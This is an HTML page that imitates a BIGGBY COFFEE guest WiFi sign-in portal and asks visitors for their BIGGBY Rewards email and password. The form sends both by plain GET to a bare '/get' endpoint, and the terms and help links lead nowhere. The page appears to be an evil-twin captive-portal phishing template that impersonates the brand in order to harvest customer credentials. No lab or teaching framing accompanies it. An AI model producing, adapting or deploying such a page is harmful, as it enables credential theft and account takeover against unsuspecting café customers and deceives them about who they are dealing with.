<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>BIGGBY COFFEE WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Impact,"Arial Black",Arial,sans-serif;background:#E31837;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px;background:#fff;border-radius:0;overflow:hidden;box-shadow:0 8px 40px rgba(0,0,0,0.3)}
.top{background:#E31837;padding:26px 24px 16px;text-align:center}
.brand{font-size:36px;font-weight:900;color:#FFD700;letter-spacing:2px;text-transform:uppercase}
.tagline{font-size:10px;font-weight:700;color:rgba(255,255,255,0.9);letter-spacing:2px;text-transform:uppercase;margin-top:4px;font-family:Arial,sans-serif}
.mid{background:#C0001A;padding:8px 24px;display:flex;align-items:center;gap:8px}
.dot{width:7px;height:7px;background:#FFD700;border-radius:50%;flex-shrink:0}
.mid span{font-size:11px;color:rgba(255,255,255,0.8);font-family:Arial,sans-serif}
.mid strong{color:#FFD700}
.body{padding:24px;font-family:Arial,sans-serif}
h2{font-size:18px;font-weight:900;color:#E31837;margin-bottom:3px}
.sub{font-size:12.5px;color:#aaa;margin-bottom:4px}
.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#888;margin-bottom:6px;margin-top:18px}
input{width:100%;padding:12px 14px;border:2px solid #ffd0d5;border-radius:0;font-size:14.5px;background:#fff9f9;color:#1a1a1a;font-family:Arial,sans-serif}
input:focus{outline:none;border-color:#E31837}
input::placeholder{color:#ddd}
.btn{width:100%;padding:13px;margin-top:20px;border:none;background:#E31837;color:#FFD700;font-size:16px;font-weight:900;letter-spacing:2px;text-transform:uppercase;cursor:pointer;font-family:Impact,"Arial Black",Arial,sans-serif}
.terms{font-size:11px;color:#bbb;text-align:center;margin-top:12px;line-height:1.6;font-family:Arial,sans-serif}
.terms a{color:#E31837}
.foot{background:#fff9f9;border-top:2px solid #ffd0d5;padding:11px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#bbb;text-decoration:none;font-family:Arial,sans-serif}
.foot a{color:#E31837}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="brand">BIGGBY</div>
    <div class="tagline">Be Happy. Drink Coffee.</div>
  </div>
  <div class="mid"><div class="dot"></div><span>Network: <strong>BIGGBY_WiFi</strong></span></div>
  <div class="body">
    <h2>BIGGBY Guest WiFi</h2>
    <p class="sub">Sign in with your BIGGBY Rewards account to connect.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">CONNECT</button>
      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; BIGGBY COFFEE</span><a href="#">Help</a></div>
</div>
</body>
</html>
